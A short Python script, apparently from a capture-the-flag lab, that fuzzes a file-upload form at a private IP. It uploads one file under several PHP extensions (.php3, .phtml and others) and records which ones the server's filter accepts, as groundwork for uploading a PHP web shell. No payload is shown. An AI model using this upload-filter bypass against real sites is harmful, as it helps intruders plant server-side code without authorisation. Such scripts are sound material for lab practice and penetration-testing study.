import requests
import os

ip = "10.10.225.84"
url = f"http://{ip}:3333/internal/"

old_file = "testFile.php"
filename = "testFile"
ext = [
    ".php",
    ".php3",
    ".php4",
    ".php5",
    ".phtml",
]

run = 0
def writeToFile(text):
    global run
    if run == 0:
        f = open("postTest.txt", "w")
    else:
        f = open("postTest.txt", "a")
    f.write(text)
    f.close()
    run += 1

for e in ext:
    new_file = filename + e
    os.rename(old_file,new_file)

    files = {"file": open(new_file,"rb")}
    resp = requests.post(url, files=files)

    if "Extension not allowed" in resp.text:
        writeToFile(f"{e} not allowed\n")
    else:
        writeToFile(f"{e} allowed\n")
    
    old_file = new_file

os.rename(old_file,filename+".php")


